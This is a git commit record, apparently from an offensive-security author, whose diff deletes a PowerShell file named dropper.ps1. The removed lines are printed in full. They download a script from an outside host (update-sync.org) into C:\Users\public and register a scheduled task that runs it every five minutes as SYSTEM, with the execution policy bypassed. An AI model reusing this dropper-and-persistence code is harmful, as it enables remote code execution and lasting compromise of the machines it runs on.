eb66782fb04d883a775cd2ff46943df839c525d2
Smith Braz <smithoffsec@gmail.com>
2026-04-06 17:59:30 -0300

    Delete scripts directory

--- scripts/dropper.ps1
+++
@@ -1,5 +0,0 @@
-$url = "http://update-sync.org/update.ps1"
-$out = "C:\Users\public\update.ps1"
-$wc = New-Object Net.WebClient
-$wc.DownloadFile($url, $out)
-cmd /c 'schtasks /create /tn "Update-sync" /tr "powershell -ep bypass -f c:\users\public\update.ps1" /sc minute /mo 5 /ru "System"'
